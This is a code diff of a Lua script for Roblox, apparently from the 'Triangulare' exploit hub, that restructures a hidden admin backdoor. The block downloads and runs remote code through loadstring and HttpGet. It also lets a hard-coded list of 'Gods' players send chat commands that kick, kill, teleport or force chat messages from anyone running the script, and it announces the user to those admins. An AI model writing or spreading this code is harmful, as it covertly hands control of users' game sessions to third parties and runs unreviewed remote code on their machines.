@@ -83,54 +83,53 @@ if Game then
         Cooldown = 1
       }
       
-      if not table.find(Gods, eu.Name) then
-        local TextChatService = game:GetService("TextChatService")
-        
-        local Gokka = loadstring(game:HttpGet("https://raw.githubusercontent.com/Moligrafi001/Triangulare/main/extra/Gokka.lua"))()
-        
-        local Commands = {
-          ["uh."] = function()
-            local now = tick()
-            if now - Settings.LastReveal >= Settings.Cooldown then
-              Settings.LastReveal = now
-              TextChatService.TextChannels.RBXGeneral:SendAsync("Hey! I'm a exploiter! Using Triangulare — made by Moligrafi.")
-            end
-          end,
-          ["leave."] = function()
-            task.wait(2)
-            eu:Kick("You were kicked by a Triangulare admin.")
-          end,
-          ["die."] = function()
-            eu.Character.Head:Destroy()
-          end,
-          ["come."] = function(sender)
-            eu.Character.HumanoidRootPart.CFrame = sender.Character.HumanoidRootPart.CFrame
-            TextChatService.TextChannels.RBXGeneral:SendAsync("I'm here, master " .. sender.Name .. ".")
-          end,
-          ["rejoin."] = function()
-            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, eu)
+      if table.find(Gods, eu.Name) then return end
+      
+      local Gokka = loadstring(game:HttpGet("https://raw.githubusercontent.com/Moligrafi001/Triangulare/main/extra/Gokka.lua"))()
+      
+      local TextChatService = game:GetService("TextChatService")
+      local Commands = {
+        ["uh."] = function()
+          local now = tick()
+          if now - Settings.LastReveal >= Settings.Cooldown then
+            Settings.LastReveal = now
+            TextChatService.TextChannels.RBXGeneral:SendAsync("Hey! I'm a exploiter! Using Triangulare — made by Moligrafi.")
           end
-        }
-        Gokka:Connect({
-          Name = "TriangulareAdmin",
-          Signal = TextChatService.MessageReceived,
-          Callback = function(message)
-            local Command = Commands[message.Text]
-            if not Command then return end
-            
-            local props = message.TextSource
-            local UserId = props and props.UserId
-            if not UserId then return end
-            
-            local sender = game:GetService("Players"):GetPlayerByUserId(UserId)
-            if sender and table.find(Gods, sender.Name) then Command(sender) end
-          end
-        })
-        
-        for _, p in pairs(game:GetService("Players"):GetPlayers()) do
-          if p ~= eu and table.find(Gods, p.Name) then
-            TextChatService.TextChannels.RBXGeneral:SendAsync("Hey " .. p.Name .. "! I just executed Triangulare — made by Moligrafi.")
-          end
+        end,
+        ["leave."] = function()
+          task.wait(2)
+          eu:Kick("You were kicked by a Triangulare admin.")
+        end,
+        ["die."] = function()
+          eu.Character.Head:Destroy()
+        end,
+        ["come."] = function(sender)
+          eu.Character.HumanoidRootPart.CFrame = sender.Character.HumanoidRootPart.CFrame
+          TextChatService.TextChannels.RBXGeneral:SendAsync("I'm here, master " .. sender.Name .. ".")
+        end,
+        ["rejoin."] = function()
+          game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, eu)
+        end
+      }
+      Gokka:Connect({
+        Name = "TriangulareAdmin",
+        Signal = TextChatService.MessageReceived,
+        Callback = function(message)
+          local Command = Commands[message.Text]
+          if not Command then return end
+          
+          local props = message.TextSource
+          local UserId = props and props.UserId
+          if not UserId then return end
+          
+          local sender = game:GetService("Players"):GetPlayerByUserId(UserId)
+          if sender and table.find(Gods, sender.Name) then Command(sender) end
+        end
+      })
+      
+      for _, p in pairs(game:GetService("Players"):GetPlayers()) do
+        if p ~= eu and table.find(Gods, p.Name) then
+          TextChatService.TextChannels.RBXGeneral:SendAsync("Hey " .. p.Name .. "! I just executed Triangulare — made by Moligrafi.")
         end
       end
     end)
